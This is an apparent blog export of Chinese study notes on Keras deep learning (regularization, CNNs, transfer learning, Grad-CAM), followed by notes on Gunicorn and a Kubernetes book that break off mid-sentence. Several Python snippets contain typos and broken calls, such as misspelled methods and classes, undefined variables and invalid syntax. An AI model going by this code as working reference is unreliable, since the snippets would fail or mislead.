map，其实就是 3D 张量（包含高度和宽度两个空间轴，和一个深度轴，深度轴也叫通道轴），它即可以是输入，也可以是输出（此处的通道很像 Dense 层里面的隐藏单元，用来存放计算结果）； 过滤器：filter，3D 张量深度轴的不同通道即是代表过滤器；通道值是过滤器对输入数据的某一方面进行编码的结果； 评估机器学习模型可泛化的模型：在新数据上面表现良好的模型；泛化能力是评估一个模型优秀与否的指标； 模型的超参数：指模型的层数、每层大小（隐藏单元数量）这些参数；模型的参数：指每层的权重值； 训练集、验证集和测试集将数据分成三个集合是必要的，因为在训练过程中，模型反复根据验证集的验证结果进行参数的调整，这会导致模型与验证集的拟合性越来越好，但是在全新数据上面的性能却不一定更好；所以需要有一个测试集，做为全新的数据来对模型进行评估； 三种经典的模型评估方法1. 简单留出验证将数据分成三部分，其中的训练集、验证集用来训练模型，测试集用来评估模型；缺点：当样本数很少时，这种方法很容易跟数据过拟合；过拟合可以通过随机打乱数据集来训练模型，看最后的结果是否波动很大； 2. K 折验证将数据均分大小相同的 K 个分区，每次取其中一个分区作为验证集，余下做为训练集；最后取 K 个分数的平均值作为评分； 3. 重复 K 折验证进行多次 K 折验证，每次都将数据先打乱；这种方式的计算成本比较高；需要计算 K * P 次 评估模型的注意事项 数据代表性：一般通过随机打乱数据来实现； 时间箭头：如果是解决用旧数据预测未来新数据的问题，则注意训练的数据与测试的数据有时间点的区隔，不可重叠； 数据冗余：确保训练集和测试集没有任何交集，避免因为有数据冗余导致隐藏交集； 数据预处理、特征工程和特征学习神经网络的数据预处理 向量化：data vectorization，神经网络的输入和目标都必须是浮点数张量（少数特殊情况可接收整数）； 值标准化：让所有特征的均值为0，标准差为1；输入数据应满足同质性，即大致相同的取值范围； 处理缺失值：一般使用 0 来代表缺失值；如果样本集中没有缺失值，但未来的新数据有可能有缺失值，那么训练出来的网络无法应对有缺失值的情况，此时需要人工生成一些缺失值的样本； 特征工程特征工程的作用在于：用更简单的方式来表达问题，从而使得问题的解决变得更容易； 虽然现代的卷积神经网络可以自动学习特征，使得大部分特征工程变得没有必要，但是良好的特征工程仍然重要，原因有二： 用更少的计算资源更优雅的解决问题 用更少的数据样本即可解决问题； 过拟合和欠拟合机器学习的根本问题是优化（optimization）和泛化（generalization）的对立； 防止模型从训练数据中学到错误或无关紧要的模式，方法有二： 最优的方法：收集更多的数据用于训练； 次优的方法：调节模型允许存储的信息量，或对允许存储的信息增加约束；原因：模型允许存储的信息量越少，模型越容易记住更关键的信息； 降低过拟合的方法：正则化 regularization1. 减少网络大小如果模型的容量足够大（由层数和每层单元数决定），模型将很容易实现样本和目标之间的映射关系，但这种映射却对泛化能力有害； 反之，如果容量不那么大，则无法轻松实现映射，此时模型就需要学会对目标具有很强预测能力的压缩表示，这样对泛化有利；但容量也不能太小，不然容易出现欠拟合问题； 暂时没有魔法公式可以确定最佳层数和每层最佳单元数，这需要使用验证集进行反复实验才能得到最佳结果； 2. 添加权重正则化 奥卡姆剃刀原则：如果一件事情有两种解释，那么最可能正确的是最简单的那个（即假设条件最少的那个）； 给定一些训练数据和一种网络架构，很多组权重值（即很多模型）都可以解释这些数据，此时，简单的模型比复杂的模型更不容易过拟合； 这里的简单模型指参数分布的熵更小的模型，或参数更少的模型；熵被用计算一个系统中的失序现象，即系统的混乱程度；熵越高 ，系统越混乱； 通过强制让模型权重取较小的值，从而限制模型的复杂度，使得权重值的分布更加规则（regular）；这种方法叫权重正则化（weight regularization）；实现方法：向网络的损失函数中添加与较大权重值相关的成本，Keras 中通过向层传递权重正则化项实例（weight regularizer）； L1 正则化：添加的成本与权重系数的绝对值成正比； L2 正则化：添加的成本与权重系数的平方成正比；此方法也叫权重衰减（weight decay）； 由于惩罚项只在训练时添加，测试没有添加，因此网络的训练损失会比测试损失大很多； 3. 添加 dropout 正则化对某一层使用 dropout，就是在训练过程中随机将该层的一些输出特征舍弃（设置为 0）；dropout 的比率通常在 0.2~0.5 范围内； 测试时没有单元被舍弃，而该层的输出值需要按 dropout 比率缩小，因为此时有更多的单元被激活，需要加以平衡；但在实践中，一般这个平衡的动作是在训练时操作，即先 dropout，再将输出成比例放大；而最后测试时输出保持不变；dropout 的思想在于在层的输出中引入一些噪声，从而避免模型学习到一些偶然的模式，从而降低过拟合的概率； 机器学习的通用工作流程1. 定义问题，收集数据集使用机器学习解决问题的关键在于以下两个假设成立： 假设输出是可以根据输入进行预测的；（数据与答案有关联） 现实中，有很多问题的答案，如果跟过去的历史并没有关系，则机器学习到的模型并不能用来很好的预测未来； 假设可用数据包含足够多的信息，足以学习输入和输出之间的关系；（数据足够多） 数据必须是在一个平稳的尺度上收集的；例如用夏天的服装销售数据预测冬天的销量并没有意义，因为机器学习无法解决非平稳问题（nonstationary problem）； 2. 选择衡量成功的指标制定衡量成功的指标，与损失函数的选择相关；不同类别的问题，选择不同的指标； 平衡分类问题（每种类别的可能性相同）：常用指标为精度和 ROC AUC（area under the receiver operating characteristis curve，接收者操作特征曲线下面积）； 不平衡的分类问题：常用指标为准确率和召回率（问：啥是召回率？答：所有为真值的样本，被正确识别出来的比例，而准确率表示被认为是真的那些样本，确实为真的比例）； 排序问题或多标签分类：常用指标为平均准确率均值（mean average precision）； 其他更多的问题类型和对应的自定义指标，可以浏览 Kaggle 网站上的数据竞赛，上面有各式各样的问题和评估指标； 3. 确定评估方法留出验证集、K 折验证、重复 K 折验证，三者选其一；一般情况下，第一种方法即可满足要求（除非样本数很小）； 4. 准备数据将数据格式化，转换成张量数据； 5. 开发比基准更好的模型此阶段的目标在于先开发一个”小型“模型，它要能够打败纯随机的基准（dumb baseline），即获得统计功效（statistical power）； 如果不能获得统计功效，那有可能答案并不在数据里，先前的两个假设可能是错误的； 构建模型需要选择的三个关键参数： 最后一层的激活：它用来对网络的输出做有效的限制； 损失函数：需要匹配问题类型； 优化器：一般使用 rmsprop 即可； 衡量问题成功与否的指标，有时并不能用损失函数进行优化，因为损失函数有两个要求，一是即使小批量数据也可以计算，二是必须是可微的；此时的办法是使用替代指标，例如 ROC AUC 的替代指标为交叉熵； 6. 扩大模型规模：开发过拟合的模型在有了统计功效的小模型之后，接下来要做的是扩大它，让它变成过拟合；因为理想的模型刚好处在欠拟合和过拟合的分界线上；所以需要先达到过拟合的状态，才能发现二者的分界线； 开发过拟合模型的办法： 添加更多的层； 每层变得更大； 训练更多的轮次； 通过始终监控训练损失和验证损失，以及所关注指标的训练值和验证值，来发现是否出现过拟合； 7. 模型正则化与调节参数此步的目标是反复对模型进行局部的调节优化，以便达到最佳的性能； 调节模型的方法： 添加 dropout 尝试不同的架构：增加或减少层数； 添加 L1 和(或) L2 正则化（正则化：在损失函数中，给更大的权重值添加一些成本）； 尝试不同的超参数（比如每层的单元个数，或优化器的学习率），以找到最佳配置 （可选）反复做特征工程：添加新特征，或者删除没有信息量的特征； 一旦开发出满意的模型配置后，就可以在训练集和验证集上训练最终的生产模型，然后在测试集上最后评估一次； 如果测试集上的性能比验证集差很多，则说明验证流程并不可靠，或者模型在验证数据上出现了过拟合；此时，需要更换为更可靠的验证方法，如 K 折验证等； 5. 深度学习用于计算机视觉卷积神经网络简介卷积网络在处理图像时特别好用，原因在于它对应了图像的两种基本特征： 平移不变性：在某个局部位置学习到的模式，可以适用于其他位置，即局部模式可以进行平移；密集连接网络学习到的模式是全局关系，因此它不具备平移不变性；（可移植） 空间层次性：在某个层次学习到的模式，可以在下一个层次中进行组合，变成更大的模式；（可组合） 卷积运算过程 按一定大小的窗口，例如 3 * 3，对图片进行某个局部位置做卷积运算，得到一个有深度的输出结果；在深度维度上的每一个值，代表在这个小窗口中学习到的一个小特征；深度可以自定义； 平移小窗口，对整张图片进行卷积运算，就会得到由各种小特征组成的一个 3D 特征矩阵；矩阵的长宽分别代表一个窗口运算的结果，矩阵的深度则是该窗口的小特征集合； 接下来使用最大池化技术，对上一步获取的特征矩阵，进行采样；使用 2 * 2 窗口按步幅 2 进行采样，而卷积层是使用 3 * 3 窗口按步幅 1 进行计算； 总结来说就是两步，第一步是找特征，第二步是对特征进行采样（采集明显与众不同的那些特征）； 除了卷积计算外，还是一个反向卷积计算，叫 Deconvolution，也叫 transpose convolution；先使用正向卷积提取关键特征后，再用反向卷积可以提纯这些特征，去除最原始的噪声；在做反卷积计算时，由于输出比输入大，因此需要做一些 padding 的工作，然后才能够作常规的卷积核乘积计算； 反向卷积常用于图片分割任务，因为分割涉及像素级的操作，所以不能使用样本来代表整个图片，因此需要让最后的数据仍然保持和输入时一样，此时就可以先通过正向卷积获取关键特征，最后再通过反向卷积重新生成图片，用于分割；另外在 super-resolution，GAN，Surface depth estimation 任务中也会用到；可以说，凡是输出需要输入大的场景，都有可能会用到它； 用最大池化进行采样的目的 一是可以减少需要处理的特征图的元素的个数； 二是让观察窗口越来越大，覆盖原输入图的全部位置，从而可以学习到由局部图像组成的空间层次模式； 观察不同特征的最大值，而非平均值，更容易发现一些特征信息，因为特征通常是突出表现，与众不同的； 在小型数据集上从头开始训练一个卷积神经网络 卷积网络学习到的模式因为具有局部性和平移不变性的特点，相比其他网络模型，它可以在一个相对较小的数据集上学到较多的有用信息，取得还不错的效果； 如果要处理问题和数据比较大比较复杂，则应相应增加一些层数和单元数，以便有足够的容量存储学习到特征信息，避免欠拟合； Keras 有自带一个图像处理类，它能很好的完成图像处理的一些常见任务（以 python 生成器来实现）； 在较小的图片数据集上，可以使用数据增强（data augmentation）的技巧，来间接扩大数据集（它的本质上对图像做一些变形以生成新图片，例如旋转、翻转、缩放、拉伸等）；但是由于数据增强的数据来源仍是原始数据，所以部分数据是高度相关的，为避免产生过拟合，一般配合使用 dropout 层添加一些噪声来平衡； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 下载图片，准备数据import os, shutil# 原始数据解压后的存放目标original_dataset_dir = &quot;/downloads/kaggle_original_data&quot;# 较小数据集的保存目录base_dir = &#x27;/downloads/cats_and_dogs_small&#x27;os.mkdir(base_dir)train_dir = os.path.join(base_dir, &quot;train&quot;)os.mkdir(train_dir)validation_dir = os.path.join(base_dir, &quot;validation&quot;)os.mkdir(validation_dir)test_dir = os.path.join(base_dir, &quot;test&quot;)os.mkdir(test_dir)train_cats_dir = os.path.join(train_dir, &quot;cats&quot;)os.mkdir(train_cats_dir)train_dogs_dir = os.path.join(train_dir, &quot;dogs&quot;)os.mkdir(train_dogs_dir)validation_cats_dir = os.path.join(validation_dir, &quot;cats&quot;)os.mkdir(validation_cats_dir)validation_dogs_dir = os.path.join(validation_dir, &quot;dogs&quot;)os.mkdir(validation_dogs_dir)test_cats_dir = os.path.join(test_dir, &quot;cats&quot;)os.mkdir(test_cats_dir)test_dogs_dir = os.path.join(test_dir, &quot;dogs&quot;)os.mkdir(test_dogs_dir)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(train_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000, 1500)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(validation_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;cat.&#123;&#125;.jpg&#x27;.format(i) for i in range(1500, 2000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(test_cats_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(train_dogs_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1000, 1500)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(validation_dogs_dir, fname) shutil.copyfile(src, dst)fnames = [&#x27;dog.&#123;&#125;.jpg&#x27;.format(i) for i in range(1500, 2000)]for fname in fnames: src = os.path.join(original_dataset_dir, fname) dst = os.path.join(test_dogs_dir, fname) shutil.copyfile(src, dst) 数据预处理123456789101112131415161718192021222324252627# 数据预处理# 读取图片，将图片转换为像素风格；将像素网络转换为浮点数张量；将像素值缩放到[0, 1] 之间；from keras.preprocessing.image import ImageDataGeneratortrain_data_gen = ImageDataGenerator(rescale=1./255)test_data_gen = ImageDataGenerator(rescale=1./255)# generator 表示生成器，它会在每次被调用时，生成并返回一份数据# 有点像迭代器，通常和 for...in... 配合使用# 生成器跟迭代器不同的地方在于，它没有终点，只要一直被调用，就会不断生成数据# 所以需要在某个时间点使用 break 进行终止train_data_generator = train_data_gen.flow_from_director( train_dir, target_size=(150, 150), batch_size=20, # 此处使用二进制类模式，原因在于问题本身是一个二元分类问题，后续计算时 # 将使用二元交叉熵作为损失函数 class_mode=&#x27;binary&#x27; )validation_data_generator = test_data_gen.flow_from_director( valication_dir, target_size=(150, 150), batch_size=20, class_mode=&#x27;binary&#x27; ) 构建网络1234567891011121314151617181920# 构建网络from tensorflow.keras import modelsfrom tensorflow.keras import layersmodel = model.Sequential()model.add(layers.Conv2D(32, (3, 3), activation=&quot;relu&quot;), input_shape=(150, 150, 3))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(64, (3, 3), activation=&quot;relu&quot;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(128, (3, 3), activation=&#x27;relu&#x27;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Conv2D(128, (3, 3), activation=&#x27;relu&#x27;))model.add(layers.Maxpooling2D((2, 2)))model.add(layers.Flatten())model.add(layers.Dense(512, activation=&#x27;relu&#x27;))model.add(layers.Dense(1, activation=&#x27;sigmoid&#x27;)) 开始训练123456789101112# 开始训练，此处使用了 fit_generator 方法，跟之前用的 fit 方法不同# 它的不同之处在于，它接受生成器作为参数，而不是 numpy 数组# history = model.fit_generator( train_generator, steps_per_epoch=100, epochs=30, validation_data=validation_generator, validation_steps=50)# 在训练完成后保存模型model.save(&quot;path/to/model.h5&quot;) 数据增强12345678910111213141516171819# 数据增强，可以通过对图片进行随机的变形，来增加训练的数据量# 通过在实例化 Image 数据生成器时，引入更多参数来实现# 之后通过这个实例化后的对象来处理图片时，会自动随机添加变形datagen = ImageDataGenerator( rotation_range=40, width_shift_range=0.2, height_shift_range=0.2, shear_range=0.2, zoom_range=0.2, horizontal_flip=True, fill_mode=&#x27;nearest&#x27;)# 为了尽可能避免过拟合，还有一种方法是在展平层之后，添加 dropout 层，引入一些随机的噪音# 强迫模型去学习噪音背后有用和真实存在的识别模式model.add(layers.Flatten())model.add(layers.Dropout(0.5))model.add(layers.Dense(512, activation=&#x27;relu&#x27;))model.add(layers.Dense(1, activation=&#x27;sigmoid&#x27;)) 使用预训练的卷积神经网络 深度学习的模型在本质天生具备高度的可复用性，这意味着，可以利用别人在大数据集上训练好的模型，做一些微调，来完成一些小数据集上面的任务；前提是该预训练的网络模型的原始数据集是足够大、足够通用的；而不是某种特定的任务； 12# 使用预训练的模型from keras.applications import VGG16 使用预训练网络的两种方法：特征提取、微调模型； 特征提取 一般来说，一个训练好的卷积神经网络包含两个部分，一个是由卷积层和池化层组成的卷积基，一个是密集连接层组成的分类器；除非问题完全相同，不然一般只复用卷积基，而不复用分类器，因为分类器是面向特定问题的； 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# 实例化模型，获得其卷积基（通过将 include_top 设置为 false 来实现，表示不复用顶层的分类器）conv_base = VGG16( weights=&#x27;imagenet&#x27;, include_top=False, input_shape=(150, 150, 3))import osimport numpy as np from keras.preprocessing.image import ImageDataGenerator# 指定数据存储的目录base_dir = &#x27;/downloads/cats_and_dogs_small&#x27;train_dir = os.path.join(base_dir, &quot;train&quot;)validation_dir = os.path.join(base_dir, &quot;validation&quot;)test_dir = os.path.join(base_dir, &quot;test&quot;)# 此处实例化的数据生成器没有使用数据增强datagen = ImageDataGenerator(rescale=1./255)batch_size = 20# 将图片做为输入，利用已训练好的模型的卷积基，获得计算后的特征（即输出）def extract_features(directory, sample_count): features = np.zeros(shape=(sample_count, 4, 4, 512)) # 现在处理的是一个二元分类问题，所以 labels 只有一维 labels = np.zeros(shape=(sample_count)) generator = datagen.flow_from_directory( directory, target_size=(150, 150), batch_size=batch_size, class_mode=&#x27;binary&#x27; ) i = 0 for inputs_batch, labels_batch in generator: features_batch = conv_base.predict(inputs_batch) features[i * batch_size : (i + 1) * batch_size] = features_batch labels[i * batch_size : (i + 1) * batch_size] = labels_batch i += 1 if i * batch_size &gt;= sample_count: break return features, labels# 从目录中提取图片，用卷积基进行计算，将结果保存下来train_features, train_labels = extract_features(train_dir, 2000)validation_features, validation_labels = extract_features(validation_dir, 1000)test_features, test_labels = extract_features(test_dir, 1000)# 以上获得的特征的形状是 (sample, 4, 4, 512)，由于接下来要将这些# 特征做为密集层的输入，因此需要将它们展开成二维的train_features = np.reshape(train_features, (sample_count, (2000, 4 * 4 * 512)))validation_features = np.reshape(validation_features, (sample_count, (2000, 4 * 4 * 512)))test_features = np.reshape(test_features, (sample_count, (2000, 4 * 4 * 512)))# 接下根据自身的业务场景，添加自己的密集层进行训练model = models.Sequential()model.add(layers.Dense(256, activation=&#x27;relu&#x27;, input_dim=4 * 4 * 512))model.add(layers.Dropout(0.5))model.add(layers.Dense(1, activation=&quot;sigmoid&quot;))model.compile( optimizer=optimizers.RMSprop(1r=2e-5), loss=&#x27;binary_crossentropy&#x27;, metrics=[&quot;accuracy&quot;])history = model.fit( train_features, train_labels, epochs=30, batch_size=30, validation_data=(validation_features, validation_labels)) 如果特征提取想要使用数据增强（当样本数比较少时），则需要换一种方法：扩展卷积基； 这种方法的计算代价比较大，因为数据要流过整个卷积基，按模型训练的方式重新计算，而不是像前一种方法基于已有参数快速进行预测计算即可； 12345678# 扩展卷积基model = model.Sequential()# 在将卷积基加上模型前，需要先对其进行冻结，避免训练过程中改变了它们的参数conv_base.trainable = Falsemodel.add(conv_base)model.add(layers.Flatten())model.add(layers.Dense(256, activation=&#x27;relu&#x27;)model.add(layers.Dense(1, activation=&quot;sigmoid&quot;)) 微调模型 同时，对于卷积基，越靠近输入端的那几层，其提取的特征通用性越好；越靠近输出的层，则越是面向特定分类的模式组成，越是定向化，通用性降低；因此，虽然也可以解决全部层进行重新训练，但更靠底部的层，训练回报越少； 微调步骤 复用预训练网络的整个卷积基，添加自己的分类器到模型中； 冻结卷积基，对分类器进行训练； 解冻顶部的一个卷积块，联合训练解决冻这些层和分类器； 12345678910111213141516171819# 微调模型，解冻顶部的少数层# 先将整个卷积基的 trainable 属性设置为 Trueconv_base.trainable = True # 指定将某个层的 trainable 属性设置为 True，其他仍为 Fasleset_trainable = False for layer in conv_base.layers: if layer.name == &#x27;block5_conv1&#x27;: set_trainable = True if set_trainable: layer.trainable = True else: layer.trainable = False# 使用非常小的学习率开始训练模型model.compile( optimizer=optimizers.RMSprop(lr=1e-5), loss=&quot;binary_crossentropy&quot;, metrics=[&quot;accuracy&quot;]) 卷积神经网络的可视化网络模型本质上是由层组成的，而每一层实际上又由多个过滤器组成；而过滤器本质上是一个有着特定参数的函数，它对输入数据进行计算，得到一个输出结果；该输出结果做出下一层的输入数据； 可视化网络模型，本质是就是可视化这些过滤器函数的功能；有三种观察它的方式： 一种是给定输入，看它的输出（可视化中间激活） 一种是看该函数得到最大值时的输入（可视化过滤器） 一种是看涉及分类决策在原输入图中的部位（可视化类激活图） 可视化中间激活 层的输出一般称为激活（原因：层的输出即为激活函数的输出） 随着层数的增加，模型不断对输入图像进行特征提取并进行组合，因此，到了越高的层级，特征变得越来越抽象，越无法直观理解，但是与目标类别需的信息越来越接近； 实现方法： 获取已训练好的模型的各层输出，组成一个输出列表 创建一个新的模型实例，该实现以已训练好的模型的输入和输出列表为参数； 用新模型对一张图片进行预测，得到输出结果列表； 为每一层输出的每一个通道生成一张图像（为了让图片美观，此处会对数值进行标准化处理） 可视化卷积神经网络的过滤器根据过滤器的参数，反向来计算让参数获得最大值的输入，从而知悉过滤器对什么样的模式产生响应； 实现方法： 从模型中获取某一层的输出； 使用 backend.mean 函数，计算该层输出的损失值； 使用 backend.gradients 函数，计算损失相对模型原始输入的梯度； 对梯度进行标准化（这样可以比较不同输入图像之间的计算结果）； 定义后端函数，它可以将输入的张量，转换为损失值张量和梯度值张量； 初始化一张灰度图，并随机加入一些噪声； 使用该灰度图做为初始输入值，用刚定义的后端函数进行计算损失值和梯度值张量； 将梯度值添加到灰度图中，再重复上一个步骤，循环多次（例如40次），最后将得到一系列图像，该系列图像可最大化的激活对应通道的过滤器 可视化图像中类激活的热力图图像上的不同部分，对最终分类决策重要程度不同，有些部分强相关，有些部分弱相关；假设已知输入图像对不同通道的激活强度，再加上每个通道对分类决策的重要程度，我们就可以求得输入图像的不同部分对分类决策的不同重要程度； 实现方法12345678910111213141516171819202122232425262728293031323334# 选定一张待分类的图片，先进行预处理，以便可以做为模型的输入数据 x = preprocess_input(image)；# 使用模型对图片进行预测分类，得到分类结果的输出；该输出是一个向量，由于每种类别的概率组成 preds = model.predict(x)；# 找到最大概率类型所在的下标 index = np.argmax(preds[0])# 根据该下标，在模型预测向量中取得输入图像的相关输出 image_output = model.output(:, index)；# 从模型中取出最后一个卷积层 last_conv_layer = model.get_layer(layer_name)；# 计算图像的最终输出与最后一个卷积层的梯度 grads = K.gradients(image_output, last_conv_layer.ouput)[0]# 计算梯度中每个通道的平均值 pooled_grads = K.mean(grads, axis=(0, 1, 2))# 定义后端函数，它接受一个输入，给出 pooled_grads 和 last_conv_layer 的输出特征图iterate = K.function([model.input], [pooled_grads, last_conv_layer.output[0])# 计算输入的测试图像 x 的 pooled_grads_value 和 conv_layer_output_valuepooled_grads_value, conv_layer_output_value = iterate([x])# 将特征数据的每个通道，乘以该通道对大象类型的重要程度for i in range(512): conv_layer_output_value[:, :, i] *= pooled_grads_value[i]# 上一步得到的特征图，对每个通道求平均值，即可得到热力图heatmap = np.mean(conv_layer_output_value, axis=-1)# 为了方便查看，将热力图标准化处理heatmap = np.maxmium(heatmap, 0)heatmap /= np.max(heatmap)# 将热力图叠加到原始图片上import cv2img = cv2.imread(img_path)heatmap = cv2.resize(heatmap, img.shape[1], img.shape[0])heatmap = np.uint8(255 * heatmap)heatmap = cv2.applyColorMap(heatmap, cv2.COLORMAP_JET)superimposed_img = heatmap * 0.4 + imgcv2.imwrite(superimposed_img_path, superimposed_img)","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]},{"title":"Gunicorn","slug":"Gnicorn","date":"2020-08-19T02:38:00.000Z","updated":"2024-09-21T23:14:52.546Z","comments":true,"path":"2020/08/19/Gnicorn/","permalink":"http://example.com/2020/08/19/Gnicorn/","excerpt":"","text":"在编写好 python 的 web 程序后，可使用 Gunicorn 进行部署，以便快速实现并发目标，避免重复造轮子； 运行使用命令1gunicorn [OPTIONS] [WSGI_APP] WSGI_APP 的完整格式为：$(MODULE_NAME):$(VARIABLE_NAME) MODULE_NAME 指待载入运行的文件或模块名称；可以是一个相对路径； VARIABLE_NAME 指文件中的指向 WSGI 接口的变量名称；例如 app &#x3D; Flask() 中的 app；也可以是一个返回 app 的函数调用；例如：”app:create_app()” 如果已经在配置文件中指定了 WSGI_APP，则命令行中的此参数是可选的； 常用参数-c 指定配置文件的路径 -b 绑定的 socket，格式可以为 $(HOST), $(HOST):$(PORT), fd:&#x2F;&#x2F;$(FD), unix:$(PATH), $(IP_ADDRESS) 配置Gunicorn 会从五个地方读取配置信息 环境变量； Web 框架中的特定配置文件； 指定目录下（默认当前目录）的 gunicorn.conf.py 文件（会覆盖框架配置文件的值） 通过命令行参数传递给环境变量 GUNICORN_CMD_ARGS 的值； 命令行参数； 命令行命令行参数的优先级最高，它会覆盖其他方式的配置信息；但不是所有配置项都可以使用命令行进行设置； 配置文件配置文件需要是以 .py 为后缀的 python 文件；它可以是只读的；设置配置项时，只需要在文件中定义相应的变量名称并赋值即可； 12bind = &quot;127.0.0.1:8000&quot;workers = 2","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Kubernetes 实战","slug":"Kubernetes 实战","date":"2020-08-12T01:25:00.000Z","updated":"2024-09-22T23:08:43.603Z","comments":true,"path":"2020/08/12/Kubernetes 实战/","permalink":"http://example.com/2020/08/12/Kubernetes%20%E5%AE%9E%E6%88%98/","excerpt":"","text":"1. Kubernetes 系统的需求实现硬件资源的管理和应用执行环境管理二者的分离，即开发人员和运维人员不再需要有交集，而只需专注自己的那一部分工作； 介绍容器技术Linux 从内核层面实现的隔离技术，包括进程命名空间和 cgroup 资源隔离两种机制； 优点：同样实现隔离功能，容器技术相对重量级的 VM 虚拟机机制，更加轻量化，相同的硬件资源，可以更大效率的利用； 缺点：由于不同容器共用主机的内核，因此当容器环境对内核有特定要求时，会降低容器的可移植性； Kubernetes 介绍Kubernetes 对硬件资源进行了抽象，部署应用程序时，不用再关心需要使用哪些硬件资源；所有资源都被抽象成单个大节点；不管集群中包含多少节点，集群规模都不会造成差异性，额外的集群节点只是代表一些额外的可用来部署应用的资源； 在开发者眼中，Kubernetes 可以被视为关于集群的一个操作系统，因此只需专注实现应用本身，而无须关心应用与基础设施如何集成； Kubernetes 集群结构 主节点 scheduler：负责调度，为应用分配节点； controler manager；负责管理集群； etcd：负责存储，持久化存储集群的配置信息； API 服务器：负责各个组件之间的通讯； 工作节点 容器运行时：即 Docker 或 rtk等； Kubelet：负责与 API 服务器通信，并管理当前节点内的容器； Kube-proxy：负责网络流量的负载均衡； 在 Kubernetes 中运行应用应用转描述 将应用打包成镜像； 将镜像推送到仓库； 将应用的描述发布到 Kubernetes API 服务器； 描述转容器调度器根据描述文件中每组所需的计算资源，以及每个节点当前未分配的资源，调度指定的组到可用的工作节点上； 节点收到调度器指派的组后，从仓库拉取镜像并运行容器； 保持容器运行对运行中的容器和工作节点进行监控，如果容器退出则重新创建；若工作节点宕机，则分配相应组到新的工作节点； 扩展副本数量副本数量可以手工进行增加或减少，也可以交给 Kubernetes 自行调整为最佳副本数； 命中移动目标由于容器是动态调度的，这意味着它们会移动；因此 Kubernetes 通过提供服务的静态 IP 或 DNS 服务查找 IP 两种方式，来对外提供稳定的服务； 使用 Kubernetes 的好处在任何部署了 Kubernetes 的机器上，系统管理员不再需要安装任何东西来部署和运行应用程序；而开发人员也将不需要系统管理员的任何帮助，即可以立即运行应用程序； 简化应用程序部署：所有的工作节点被抽象成一个部署平台；对于异构节点，只需在描述中增加对应用程序所需资源的选择条件即可； 更好的利用硬件：当硬件资源很多时，人工找到最佳组合的难度会变得很大； 健康检查和自修复：通过自动监控，当出现故障时，可以将应用程序迁移到备用资源上；运维人员无需立即做出反应，可以等到上班时间再排查故障即可； 自动扩容：自动根据应用程序的荷载，放大或缩小集群的规模； 简化开发人员的部署：无须系统管理员的帮助即可实现部署；同时方便 BUG 排查，在部署出错时可以停止更新自动回滚； 2. 开始使用 Kubernetes 和 Docker创建、运行和推送镜像（略） 配置 Kubernetes 集群有多种方法可以安装 Kubernetes 集群，包括： 本地的开发机器； 自己组织的机器； 虚拟机提供商的机器； 托管的集群； 由于集群的配置工作比较复杂，因此使用较多的是第1和第4种，即本地和托管两种；另外两种需要使用 kubeadm 或 kops 工具来实现； 在 Kubernetes 上运行应用最简单的方式是使用 run 命令，但常规的方式是使用 YAML 或 JSON 描述文件； pod 很像一个独立的逻辑机器，拥有自己的 IP、主机名、进程等；因此，pod 内的容器总是运行在同一个工作节点上； 每个 pod 都有自己的 IP，但这个 IP 是集群内使用的，不能被外部访问，需要通过创建服务来公开它； loadBalancer 类型的服务，会创建一个可以公开访问的公网 IP，因此它需要使用托管的集群才能实现这点，本地运行的 minikube 做不到； 服务与 pod 的关系 之所以需要服务这个抽象层，其原因在于 pod 的生命周期是短暂的，它有可能因为各种意外的场景消失了，而重新创建的 pod 会有不一样的 IP 地址；因此，需要有一个能够提供静态 IP 访问地址的服务层，并由这个服务层将访问请求路由到当前正常工作的 pod 中； 3. pod：运行于 Kubernetes 中的容器pod 是 kubernetes 中最核心的概念，而其他组件仅仅是管理或暴露它，或者被它所使用； 介绍 pod每个容器只运行一个单独的进程是一种好的 docker 实践（除非是该进程自行产生的子进程）； 为什么多容器协作优于单容器多进程的协作？ 多进程之间需要解释依赖冲突的问题； 当某个进程崩溃需要重启时，多进程场景增加了复杂度； 为何需要 podKubernetes 通过配置 docker 让一个 pod 内的所有容器共享相同的 Linux 命令空间，而不是每个容器都有自己的一组命名空间；这种做法可以让容器之间很方便的实现资源共享，包括 IP 地址、端口空间、主机名、IPC命名空间等；但不共享文件系统，而是通过 docker 的 volume 机制来实现数据的共享； 一个 pod 中的所有容器具有相同的 loopback 网络接口，因此容器之间可以通过 localhost 与同一个 pod 中的其他容器进行通信； 集群中的所有 pod 都在同一个网络地址空间中，这意味着每个 pod 都可以使用其他 pod 的 IP 地址，与该 pod 直接进行通信，而无须 NAT 网络地址转换； 总结：pod 就像一台逻辑主机，其行为和物理主机或虚拟主机非常相似，区别在于运行于 pod 当中的每个进程被封装在一个容器之中； 通过 pod 合理管理容器将多层应用分散到多个 pod 中是一种更好的实践，这样可以更充分的利用集群中的节点的计算资源，因为单个 pod 只会被安装在一个工作节点上；并且这样也方便更细粒度的对应用进行扩容； 何时在一个 pod 